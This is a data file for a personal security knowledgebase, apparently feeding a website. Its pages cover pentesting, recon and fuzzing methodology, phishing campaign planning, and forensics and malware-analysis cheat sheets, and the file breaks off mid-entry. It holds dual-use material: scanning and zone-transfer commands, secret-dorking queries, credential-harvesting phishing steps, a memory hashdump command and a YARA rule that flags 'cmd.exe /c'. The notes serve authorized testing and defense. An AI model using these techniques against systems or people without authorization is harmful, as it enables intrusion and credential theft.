window.SITE_DATA = {
 "siteTitle": "CASEFILE",
 "siteTagline": "Personal Security Knowledgebase — Methodologies, Payloads & Field Notes",
 "author": "Hechan",
 "categories": [
  {
   "title": "🤩 Generic Methodologies & Resources",
   "slug": "generic-methodologies-resources",
   "type": "category",
   "children": [
    {
     "title": "Pentesting Methodology",
     "slug": "pentesting-methodology",
     "type": "page",
     "children": [],
     "tag": "TAG-0001",
     "content": "# General Pentesting Methodology\n\nA repeatable framework for approaching almost any engagement, from a single web app to a full internal network. Treat this as a checklist of *phases*, not a rigid script — skip what doesn't apply.\n\n## 1. Scoping & Rules of Engagement\n- Confirm in-scope IPs/domains/apps in writing, testing window, and emergency contact.\n- Note any fragile systems (ICS, medical devices, legacy servers) that need extra care.\n- Clarify whether social engineering, DoS testing, and physical access are permitted.\n\n## 2. Reconnaissance\n- **Passive**: WHOIS, DNS history, certificate transparency logs (crt.sh), search engine dorking, GitHub/GitLab leaks, job postings (reveal tech stack), LinkedIn (org structure for phishing).\n- **Active**: port scanning, service fingerprinting, subdomain brute-forcing, directory brute-forcing on web apps.\n\n```bash\n# Fast initial sweep\nnmap -sV -sC -oA initial_scan <target>\n# Full port sweep once scope confirmed\nnmap -p- -T4 -oA full_ports <target>\n# Subdomain enumeration\nsubfinder -d target.com -silent | httpx -silent\n```\n\n## 3. Enumeration\nGo service-by-service. For every open port, identify the exact software/version and cross-reference known CVEs. Don't skip \"boring\" ports — SNMP, NFS, and RPC leak more than people expect.\n\n## 4. Vulnerability Analysis\n- Map findings against a framework (OWASP Top 10 for web, MITRE ATT&CK for internal networks).\n- Prioritize by exploitability × impact, not just CVSS score alone.\n\n## 5. Exploitation\n- Start with the least destructive proof-of-concept.\n- Document every command and its output as you go — you will need this for the report and you will forget the exact syntax by the end of the day.\n- Get a foothold, then stop and reassess before moving laterally.\n\n## 6. Post-Exploitation\n- Privilege escalation (see Linux/Windows privesc checklists).\n- Credential harvesting, lateral movement, persistence (only if explicitly in scope).\n- Identify what an attacker could actually reach — this is the finding that matters to the client, not just \"I got a shell.\"\n\n## 7. Reporting\n- Executive summary in plain language (no jargon) for leadership.\n- Technical findings with: description, evidence (screenshots/output), CVSS, reproduction steps, and remediation advice.\n- Always retest after the client patches, if the engagement includes it.\n\n## Quick Mental Checklist\n| Phase | Ask yourself |\n|---|---|\n| Recon | What does this org expose without me touching anything? |\n| Enum | What's actually running, and what version? |\n| Vuln analysis | What's realistically exploitable, not just theoretically? |\n| Exploitation | What's the least noisy way to prove this? |\n| Post-ex | What's the actual business impact? |\n| Reporting | Could a junior sysadmin follow my remediation steps? |",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Fuzzing Methodology",
     "slug": "fuzzing-methodology",
     "type": "page",
     "children": [],
     "tag": "TAG-0002",
     "content": "# Fuzzing Methodology\n\nFuzzing = throwing structured-but-unexpected input at a target and watching for crashes, errors, or behavioral differences. Useful everywhere: web parameters, file parsers, network protocols, binaries.\n\n## Types of Fuzzing\n- **Mutation-based**: take a valid input, mutate bytes/fields, feed it back (AFL++, Radamsa).\n- **Generation-based**: build inputs from a grammar/spec (good for structured protocols/file formats).\n- **Dumb vs coverage-guided**: coverage-guided (AFL, libFuzzer) uses instrumentation to reach new code paths faster — vastly more effective for binaries.\n\n## Web Fuzzing\n```bash\n# Directory/file discovery\nffuf -u https://target.com/FUZZ -w /path/wordlist.txt -mc 200,301,302,403\n\n# Parameter discovery\nffuf -u https://target.com/page?FUZZ=test -w params.txt -fs <baseline_size>\n\n# Vhost/subdomain fuzzing\nffuf -u https://FUZZ.target.com -H \"Host: FUZZ.target.com\" -w subdomains.txt\n```\n\nKey tuning tips:\n- Always establish a **baseline response size** first (`-fs`) to filter noise from soft-404 pages.\n- Rate-limit (`-p 0.1`) against fragile targets.\n- Combine wordlists: raft, SecLists, and a custom list scraped from the target's own JS files.\n\n## Binary/File Format Fuzzing\n```bash\n# AFL++ basic loop\nafl-fuzz -i input_corpus/ -o output/ -- ./target_binary @@\n```\n- Seed the corpus with *valid*, diverse sample files — quality of seeds matters more than quantity.\n- Watch `output/default/crashes/` for unique crashes, then triage with a debugger (GDB + `!exploitable`/`crashwalk` style triage).\n\n## API Fuzzing\n- Fuzz JSON/XML field types, not just values: send arrays where strings are expected, nested objects, huge integers, null bytes.\n- Test for mass assignment by adding unexpected fields to a valid request body.\n\n## Triage Checklist\n1. Does it crash consistently or only intermittently (race condition)?\n2. What's the exact input that triggers it — minimize it (`afl-tmin`).\n3. Is the crash in memory-unsafe code (worth checking `EIP`/`RIP` control) or just an unhandled exception (lower severity, still worth reporting)?",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "External Recon Methodology",
     "slug": "external-recon-methodology",
     "type": "page",
     "children": [
      {
       "title": "Database Leaks",
       "slug": "database-leaks",
       "type": "page",
       "children": [],
       "tag": "TAG-0004",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Wide Source Code Search",
       "slug": "wide-source-code-search",
       "type": "page",
       "children": [],
       "tag": "TAG-0005",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Github Dorks & Leaks",
       "slug": "github-dorks-leaks",
       "type": "page",
       "children": [],
       "tag": "TAG-0006",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0003",
     "content": "# External Recon Methodology\n\nEverything you can learn about a target *before* sending a single packet at the \"real\" infrastructure.\n\n## Domain & DNS\n```bash\nwhois target.com\ndig target.com ANY\ndig axfr @ns1.target.com target.com   # try a zone transfer, usually fails but worth it\n```\n- Certificate Transparency logs reveal subdomains that were never meant to be public: `crt.sh?q=%.target.com`\n- Passive DNS history (SecurityTrails, VirusTotal) can reveal old IPs behind a WAF/CDN today.\n\n## Subdomain Enumeration\n```bash\nsubfinder -d target.com -all -o subs.txt\namass enum -passive -d target.com\ncat subs.txt | httpx -title -status-code -tech-detect\n```\n\n## Source Code & Secret Leaks\n- GitHub/GitLab dorking: `org:target-company password`, `org:target-company api_key`, check forks and deleted-but-cached commits.\n- Check public package registries (npm, PyPI) for internal package names that leak infrastructure naming conventions.\n- Pastebin-style sites and public S3/GCS bucket enumeration (`s3scanner`, `gcpbucketbrute`).\n\n## People & Org Structure (for phishing pretext)\n- LinkedIn for org chart, tech stack mentioned in job postings, recently-hired employees (less likely to recognize internal norms yet).\n- Email format guessing (`first.last@`, `flast@`) validated against breach-data checkers or SMTP `VRFY`/`RCPT TO` probing (careful — noisy).\n\n## Cloud Footprint\n- Enumerate cloud assets via naming pattern guesses: `target-prod`, `target-backup`, `target-dev` against S3/Azure Blob/GCS.\n- Shodan/Censys queries scoped to the org's known ASN.\n\n## Database/Credential Leaks\n- Check if the domain appears in known breach corpora (HaveIBeenPwned API, breach databases) — validates password reuse risk, informs credential-stuffing likelihood during the engagement.\n\n## Output of This Phase\nBy the end you should have: a subdomain list with live hosts, a technology fingerprint per host, a list of employee emails/naming convention, any leaked secrets, and a rough map of cloud assets — all *before* active scanning begins.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Pentesting Network",
     "slug": "pentesting-network",
     "type": "page",
     "children": [
      {
       "title": "DHCPv6",
       "slug": "dhcpv6",
       "type": "page",
       "children": [],
       "tag": "TAG-0008",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "EIGRP Attacks",
       "slug": "eigrp-attacks",
       "type": "page",
       "children": [],
       "tag": "TAG-0009",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "GLBP & HSRP Attacks",
       "slug": "glbp-hsrp-attacks",
       "type": "page",
       "children": [],
       "tag": "TAG-0010",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "IDS and IPS Evasion",
       "slug": "ids-and-ips-evasion",
       "type": "page",
       "children": [],
       "tag": "TAG-0011",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Lateral VLAN Segmentation Bypass",
       "slug": "lateral-vlan-segmentation-bypass",
       "type": "page",
       "children": [],
       "tag": "TAG-0012",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Network Protocols Explained (ESP)",
       "slug": "network-protocols-explained-esp",
       "type": "page",
       "children": [],
       "tag": "TAG-0013",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Nmap Summary (ESP)",
       "slug": "nmap-summary-esp",
       "type": "page",
       "children": [],
       "tag": "TAG-0014",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Pentesting IPv6",
       "slug": "pentesting-ipv6",
       "type": "page",
       "children": [],
       "tag": "TAG-0015",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Telecom Network Exploitation",
       "slug": "telecom-network-exploitation",
       "type": "page",
       "children": [],
       "tag": "TAG-0016",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "WebRTC DoS",
       "slug": "webrtc-dos",
       "type": "page",
       "children": [],
       "tag": "TAG-0017",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks",
       "slug": "spoofing-llmnr-nbt-ns-mdnsdns-and-wpad-and-relay-attacks",
       "type": "page",
       "children": [],
       "tag": "TAG-0018",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Spoofing SSDP and UPnP Devices with EvilSSDP",
       "slug": "spoofing-ssdp-and-upnp-devices-with-evilssdp",
       "type": "page",
       "children": [],
       "tag": "TAG-0019",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0007",
     "content": "# Pentesting Network Overview\n\nMethodology for assessing an internal or external network segment.\n\n## Discovery\n```bash\n# Host discovery\nnmap -sn 10.0.0.0/24\n# ARP scan on local segment (faster, more reliable than ICMP)\narp-scan -l\n```\n\n## Port & Service Scanning\n```bash\nnmap -sV -sC -p- -T4 -oA full <target>\n# UDP is slow but often skipped by attackers/defenders alike — don't skip it\nnmap -sU --top-ports 100 <target>\n```\n\n## Common High-Value Targets on a Segment\n- **Domain Controllers** (389/636 LDAP, 88 Kerberos, 445 SMB) — enumerate before touching anything else on an AD network.\n- **Print servers** — frequently unpatched, often has stored credentials, printer PJL/PostScript access.\n- **Backup servers** — often has broad read access across the environment by design.\n- **Network devices** (SNMP with default `public`/`private` community strings still shockingly common).\n\n## Traffic Analysis\n- Passive listening (`tcpdump`, `Wireshark`) on a span port can reveal cleartext protocols still in use: FTP, Telnet, HTTP Basic Auth, SNMPv1/v2, LLMNR/NBT-NS broadcasts (good candidates for spoofing/relay attacks).\n\n## Segmentation Testing\n- Confirm whether VLANs actually isolate traffic as documented — double-tagging (802.1Q) and misconfigured trunk ports are common bypasses.\n- Test firewall rules bidirectionally; outbound rules are frequently far looser than inbound.\n\n## Reporting Focus\nNetwork-level findings should tie back to *reachability*: what can an attacker on this segment actually touch, not just what's technically vulnerable in isolation.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Pentesting Wifi",
     "slug": "pentesting-wifi",
     "type": "page",
     "children": [
      {
       "title": "Enable Nexmon Monitor And Injection On Android",
       "slug": "enable-nexmon-monitor-and-injection-on-android",
       "type": "page",
       "children": [],
       "tag": "TAG-0021",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Evil Twin EAP-TLS",
       "slug": "evil-twin-eap-tls",
       "type": "page",
       "children": [],
       "tag": "TAG-0022",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0020",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Phishing Methodology",
     "slug": "phishing-methodology",
     "type": "page",
     "children": [
      {
       "title": "Ai Agent Abuse Local Ai Cli Tools And Mcp",
       "slug": "ai-agent-abuse-local-ai-cli-tools-and-mcp",
       "type": "page",
       "children": [],
       "tag": "TAG-0024",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ai Agent Mode Phishing Abusing Hosted Agent Browsers",
       "slug": "ai-agent-mode-phishing-abusing-hosted-agent-browsers",
       "type": "page",
       "children": [],
       "tag": "TAG-0025",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Clipboard Hijacking",
       "slug": "clipboard-hijacking",
       "type": "page",
       "children": [],
       "tag": "TAG-0026",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Clone a Website",
       "slug": "clone-a-website",
       "type": "page",
       "children": [],
       "tag": "TAG-0027",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Detecting Phishing",
       "slug": "detecting-phishing",
       "type": "page",
       "children": [],
       "tag": "TAG-0028",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Discord Invite Hijacking",
       "slug": "discord-invite-hijacking",
       "type": "page",
       "children": [],
       "tag": "TAG-0029",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Homograph Attacks",
       "slug": "homograph-attacks",
       "type": "page",
       "children": [],
       "tag": "TAG-0030",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Mobile Phishing Malicious Apps",
       "slug": "mobile-phishing-malicious-apps",
       "type": "page",
       "children": [],
       "tag": "TAG-0031",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Phishing Files & Documents",
       "slug": "phishing-files-documents",
       "type": "page",
       "children": [],
       "tag": "TAG-0032",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0023",
     "content": "# Phishing Methodology\n\nFramework for planning an authorized phishing engagement (assumed-breach or social-engineering scope only — always confirm written authorization first).\n\n## 1. Pretext Design\n- Base the pretext on real recon: recent company news, internal tool names, org chart, IT ticketing system name.\n- Match urgency/tone to what actually gets people to click: password expiry notices, shared document links, and calendar invites consistently outperform generic \"you won the lottery\" style lures.\n\n## 2. Infrastructure Setup\n- Register a lookalike domain (homograph or same-TLD-different-word) — check it's not already flagged by threat-intel feeds.\n- Configure SPF/DKIM/DMARC on the sending domain so mail doesn't bounce or land flagged as spoofed.\n- Warm up the domain's reputation for a few days before the campaign if the timeline allows.\n\n## 3. Payload Delivery Options\n| Vector | Detection risk | Notes |\n|---|---|---|\n| Credential harvesting page | Medium | Clone target's real login page, capture creds, redirect to real site |\n| Malicious document (macro) | High (AV/EDR) | Needs signed macros or sandbox-evasion for modern environments |\n| Link to \"internal\" file share | Low | Often bypasses attachment scanning entirely |\n| OAuth consent phishing | Low | Abuses legitimate app-consent flow, no malware needed |\n\n## 4. Tracking\n- Unique tracking links per recipient to measure click-through without alerting the whole org at once.\n- Log timestamp, source IP, and user-agent of every interaction for the report.\n\n## 5. Detecting Your Own Phish (Defensive Angle)\nTeach clients to look for:\n- Sender domain that's *almost* right (0 vs O, rn vs m, added hyphen).\n- Urgency + a link + a request for credentials, all in the same email.\n- Hovering over links to check the actual destination before clicking.\n\n## 6. Reporting\n- Click rate, credential-submission rate, and report rate (how many employees flagged it to security) — report rate is the metric that actually shows security-culture maturity, not just click rate.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Basic Forensic Methodology",
     "slug": "basic-forensic-methodology",
     "type": "page",
     "children": [
      {
       "title": "Adaptixc2 Config Extraction And Ttps",
       "slug": "adaptixc2-config-extraction-and-ttps",
       "type": "page",
       "children": [],
       "tag": "TAG-0034",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Baseline Monitoring",
       "slug": "baseline-monitoring",
       "type": "page",
       "children": [],
       "tag": "TAG-0035",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Anti-Forensic Techniques",
       "slug": "anti-forensic-techniques",
       "type": "page",
       "children": [],
       "tag": "TAG-0036",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Docker Forensics",
       "slug": "docker-forensics",
       "type": "page",
       "children": [],
       "tag": "TAG-0037",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Image Acquisition & Mount",
       "slug": "image-acquisition-mount",
       "type": "page",
       "children": [],
       "tag": "TAG-0038",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ios Backup Forensics",
       "slug": "ios-backup-forensics",
       "type": "page",
       "children": [],
       "tag": "TAG-0039",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Linux Forensics",
       "slug": "linux-forensics",
       "type": "page",
       "children": [],
       "tag": "TAG-0040",
       "content": "# Linux Forensics\n\n## Live Response (if the box is still running)\n```bash\n# Volatile info first\nw; who; last -a\nps auxf\nnetstat -tulpn 2>/dev/null || ss -tulpn\nlsof -i\ncat /proc/*/cmdline 2>/dev/null   # command line of every running process\n```\n\n## Key Artifact Locations\n| Artifact | Location |\n|---|---|\n| Auth logs | `/var/log/auth.log` (Debian/Ubuntu), `/var/log/secure` (RHEL/CentOS) |\n| Shell history | `~/.bash_history`, `~/.zsh_history` — check for `HISTFILE` tampering/unset |\n| Cron jobs | `/etc/crontab`, `/etc/cron.*/`, `/var/spool/cron/` |\n| Systemd persistence | `/etc/systemd/system/`, `systemctl list-unit-files` |\n| SSH keys/config | `~/.ssh/authorized_keys`, `~/.ssh/config` |\n| Package install history | `/var/log/dpkg.log`, `/var/log/yum.log` |\n| Web server logs | `/var/log/apache2/`, `/var/log/nginx/` |\n| Login records | `/var/log/wtmp` (`last`), `/var/log/btmp` (`lastb`, failed logins) |\n\n## Persistence Hunting\n- Compare `/etc/passwd` and `/etc/shadow` against a known-good baseline — look for unexpected UID 0 accounts.\n- Check `LD_PRELOAD` and `/etc/ld.so.preload` for rootkit-style library injection.\n- Enumerate SUID/SGID binaries and diff against a baseline: `find / -perm -4000 -type f 2>/dev/null`.\n- Check for hidden/renamed processes: compare `ps` output against `/proc/*/exe` symlink targets.\n\n## Timeline Building\n```bash\n# File system timeline via mactime (from The Sleuth Kit)\nfls -r -m / /path/to/image.dd > bodyfile.txt\nmactime -b bodyfile.txt -d > timeline.csv\n```\n\n## Log Analysis Tips\n- `journalctl` on systemd systems preserves far more than flat log files — check `journalctl --since` / `--until` for a bounded window, and `journalctl -k` for kernel-level events (useful for detecting kernel module loads).\n- Correlate `auth.log` SSH logins with `wtmp`/`btmp` — discrepancies suggest log tampering.\n\n## Anti-Forensic Indicators\n- Gaps in log files (deleted entries leave sequence-number or timestamp gaps).\n- `history -c` in shell history, or a suspiciously short/empty `.bash_history` on an account clearly in active use.\n- Timestomping: file MAC times that don't match surrounding filesystem activity (compare against `$MFT`/inode change times where possible).",
       "status": "complete",
       "updated": "2026-07-10"
      },
      {
       "title": "Malware Analysis",
       "slug": "malware-analysis",
       "type": "page",
       "children": [],
       "tag": "TAG-0041",
       "content": "# Malware Analysis Basics\n\n## Static Analysis (before ever running it)\n```bash\nfile sample.exe\nsha256sum sample.exe                 # hash first, check against VirusTotal/known-bad DBs\nstrings -n 8 sample.exe | less        # look for URLs, IPs, mutexes, registry keys, error strings\npip install pefile && python3 -c \"import pefile; pe=pefile.PE('sample.exe'); print(pe.dump_info())\"\n```\n- Check PE headers/sections for anomalies: unusual section names, high entropy sections (packed/encrypted), mismatched compile timestamp.\n- `PEiD`/`DIE` (Detect It Easy) to identify packers (UPX, Themida, etc.).\n- Extract imports (`IAT`) — API calls like `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread` together strongly suggest process injection.\n\n## Dynamic Analysis (always in an isolated VM, network either air-gapped or fully simulated with INetSim/FakeNet)\n```bash\n# Monitor process/file/registry activity\nprocmon.exe    # Sysinternals, filter noise aggressively\n# Monitor network calls without real internet\nfakenet-ng\n```\n- Snapshot the VM before execution, revert after — never reuse a \"clean\" VM that ran a sample.\n- Watch for: dropped files, spawned child processes, registry Run-key writes, outbound connections (even to fake DNS in FakeNet, the *attempted* domain is valuable IOC).\n\n## Behavioral Indicators Checklist\n- [ ] Persistence mechanism (Run key, scheduled task, service)\n- [ ] C2 domains/IPs contacted\n- [ ] Files dropped and their hashes\n- [ ] Process injection or hollowing observed\n- [ ] Anti-analysis checks (VM detection, debugger detection, sleep/timing evasion)\n\n## Sandbox/Automated Tools\n- Any.run, Joe Sandbox, CAPEv2 — great for a fast triage verdict, but always validate key findings manually; sandboxes can be evaded by samples checking for known sandbox artifacts.\n\n## Unpacking Basics\n- If entropy is high (>7.2ish) across most sections → likely packed. Try running to the Original Entry Point (OEP) in a debugger, dump the unpacked memory image (`Scylla`/`x64dbg` plugins), then rebuild the import table.\n\n## YARA for Triage\n```\nrule suspicious_strings {\n  strings:\n    $a = \"cmd.exe /c\" nocase\n    $b = \"VirtualAllocEx\"\n  condition:\n    all of them\n}\n```\nUse YARA rules to quickly scan a large batch of samples or a filesystem for known-bad patterns during incident response, not just for single-sample deep-dives.",
       "status": "complete",
       "updated": "2026-07-10"
      },
      {
       "title": "Android Malware Post-Exploitation",
       "slug": "android-malware-post-exploitation",
       "type": "page",
       "children": [],
       "tag": "TAG-0042",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Memory dump analysis",
       "slug": "memory-dump-analysis",
       "type": "page",
       "children": [
        {
         "title": "Volatility - CheatSheet",
         "slug": "volatility---cheatsheet",
         "type": "page",
         "children": [],
         "tag": "TAG-0044",
         "content": "# Volatility 3 Cheat Sheet (Memory Forensics)\n\n## Setup\n```bash\npython3 vol.py -f memory.dmp windows.info      # identify profile/OS build\n```\n\n## Process Analysis\n```bash\npython3 vol.py -f memory.dmp windows.pslist      # visible processes\npython3 vol.py -f memory.dmp windows.psscan      # finds hidden/unlinked processes too\npython3 vol.py -f memory.dmp windows.pstree      # parent/child relationships\npython3 vol.py -f memory.dmp windows.cmdline     # command line of each process\n```\nCompare `pslist` vs `psscan` output — a process in `psscan` but missing from `pslist` is a strong rootkit indicator (unlinked from the active process list).\n\n## Network Artifacts\n```bash\npython3 vol.py -f memory.dmp windows.netscan     # connections + listening sockets at capture time\n```\n\n## Malware Hunting\n```bash\npython3 vol.py -f memory.dmp windows.malfind     # flags injected/suspicious memory regions\npython3 vol.py -f memory.dmp windows.dlllist --pid <PID>\npython3 vol.py -f memory.dmp windows.handles --pid <PID>\n```\n\n## Credential/Registry\n```bash\npython3 vol.py -f memory.dmp windows.hashdump    # local SAM hashes (if in scope)\npython3 vol.py -f memory.dmp windows.registry.printkey --key \"...\"\n```\n\n## File Extraction\n```bash\npython3 vol.py -f memory.dmp windows.filescan | grep -i target_filename\npython3 vol.py -f memory.dmp windows.dumpfiles --virtaddr <offset>\n```\n\n## Linux Memory (equivalent plugins)\n```bash\npython3 vol.py -f memory.dmp linux.pslist\npython3 vol.py -f memory.dmp linux.bash          # recovers bash history from memory, incl. cleared sessions\npython3 vol.py -f memory.dmp linux.netstat\n```\n\n## Workflow Tip\nRun `pslist`/`psscan` and `netscan` first — they're fast and immediately tell you where to focus (`malfind` and `dumpfiles` are slow, run them targeted at specific PIDs once you have a lead, not blindly across the whole dump).",
         "status": "complete",
         "updated": "2026-07-10"
        }
       ],
       "tag": "TAG-0043",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Partitions/File Systems/Carving",
       "slug": "partitionsfile-systemscarving",
       "type": "page",
       "children": [
        {
         "title": "File/Data Carving & Recovery Tools",
         "slug": "filedata-carving-recovery-tools",
         "type": "page",
         "children": [],
         "tag": "TAG-0046",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0045",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Pcap Inspection",
       "slug": "pcap-inspection",
       "type": "page",
       "children": [
        {
         "title": "DNSCat pcap analysis",
         "slug": "dnscat-pcap-analysis",
         "type": "page",
         "children": [],
         "tag": "TAG-0048",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Suricata & Iptables cheatsheet",
         "slug": "suricata-iptables-cheatsheet",
         "type": "page",
         "children": [],
         "tag": "TAG-0049",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "USB Keystrokes",
         "slug": "usb-keystrokes",
         "type": "page",
         "children": [],
         "tag": "TAG-0050",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Wifi Pcap Analysis",
         "slug": "wifi-pcap-analysis",
         "type": "page",
         "children": [],
         "tag": "TAG-0051",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Wireshark tricks",
         "slug": "wireshark-tricks",
         "type": "page",
         "children": [],
         "tag": "TAG-0052",
         "content": "# Wireshark / PCAP Analysis Tricks\n\n## Useful Display Filters\n```\nhttp.request                                 # all HTTP requests\ntcp.flags.syn==1 && tcp.flags.ack==0         # SYN scan / connection attempts\ndns && dns.flags.response==0                 # outgoing DNS queries (exfil over DNS candidate)\ntcp.analysis.retransmission                  # network issues or evasive scanning\nftp.request.command==\"USER\" || ftp.request.command==\"PASS\"   # cleartext FTP creds\nhttp.authorization                           # HTTP Basic Auth headers (base64 creds)\n```\n\n## Follow Streams\nRight-click any packet → **Follow → TCP/HTTP Stream** reconstructs the full conversation — the fastest way to read cleartext protocol exchanges (HTTP, FTP, Telnet, SMTP).\n\n## Extracting Files from a Capture\n`File → Export Objects → HTTP` (or SMB/DICOM) pulls out any file transferred in-band — very effective for pulling malware droppers or exfiltrated documents straight out of a PCAP.\n\n## Command-Line Equivalent (tshark)\n```bash\ntshark -r capture.pcap -Y \"http.request\" -T fields -e ip.src -e http.host -e http.request.uri\ntshark -r capture.pcap --export-objects http,./extracted/\n```\n\n## Spotting Exfiltration\n- Unusually large DNS TXT/CNAME query volume to a single domain → DNS tunneling.\n- Long-lived, low-and-slow connections to a single external IP outside business hours.\n- ICMP packets with abnormally large or consistently-sized payloads (covert channel indicator).\n\n## Detecting Scanning Activity\n- High volume of SYN packets with no completed handshake, spread across many destination ports/hosts in a short window = port scan.\n- `tcp.flags==0x000` (null scan) or `tcp.flags==0x029` (Xmas scan) are near-certain signs of reconnaissance, not legitimate traffic.\n\n## Statistics Menu (underused)\n`Statistics → Conversations` gives a fast top-talkers view — often the quickest way to spot the one host generating abnormal traffic volume in a large capture.",
         "status": "complete",
         "updated": "2026-07-10"
        }
       ],
       "tag": "TAG-0047",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Specific Software/File-Type Tricks",
       "slug": "specific-softwarefile-type-tricks",
       "type": "page",
       "children": [
        {
         "title": "Decompile compiled python binaries (exe, elf) - Retreive from .pyc",
         "slug": "decompile-compiled-python-binaries-exe-elf---retreive-from-p",
         "type": "page",
         "children": [],
         "tag": "TAG-0054",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Browser Artifacts",
         "slug": "browser-artifacts",
         "type": "page",
         "children": [],
         "tag": "TAG-0055",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Deofuscation vbs (cscript.exe)",
         "slug": "deofuscation-vbs-cscriptexe",
         "type": "page",
         "children": [],
         "tag": "TAG-0056",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Discord Cache Forensics",
         "slug": "discord-cache-forensics",
         "type": "page",
         "children": [],
         "tag": "TAG-0057",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Local Cloud Storage",
         "slug": "local-cloud-storage",
         "type": "page",
         "children": [],
         "tag": "TAG-0058",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Mach O Entitlements And Ipsw Indexing",
         "slug": "mach-o-entitlements-and-ipsw-indexing",
         "type": "page",
         "children": [],
         "tag": "TAG-0059",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Office file analysis",
         "slug": "office-file-analysis",
         "type": "page",
         "children": [],
         "tag": "TAG-0060",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "PDF File analysis",
         "slug": "pdf-file-analysis",
         "type": "page",
         "children": [],
         "tag": "TAG-0061",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "PNG tricks",
         "slug": "png-tricks",
         "type": "page",
         "children": [],
         "tag": "TAG-0062",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Structural File Format Exploit Detection",
         "slug": "structural-file-format-exploit-detection",
         "type": "page",
         "children": [],
         "tag": "TAG-0063",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Svg Font Glyph Analysis And Web Drm Deobfuscation",
         "slug": "svg-font-glyph-analysis-and-web-drm-deobfuscation",
         "type": "page",
         "children": [],
         "tag": "TAG-0064",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Video and Audio file analysis",
         "slug": "video-and-audio-file-analysis",
         "type": "page",
         "children": [],
         "tag": "TAG-0065",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "ZIPs tricks",
         "slug": "zips-tricks",
         "type": "page",
         "children": [],
         "tag": "TAG-0066",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0053",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Windows Artifacts",
       "slug": "windows-artifacts",
       "type": "page",
       "children": [
        {
         "title": "Interesting Windows Registry Keys",
         "slug": "interesting-windows-registry-keys",
         "type": "page",
         "children": [],
         "tag": "TAG-0068",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0067",
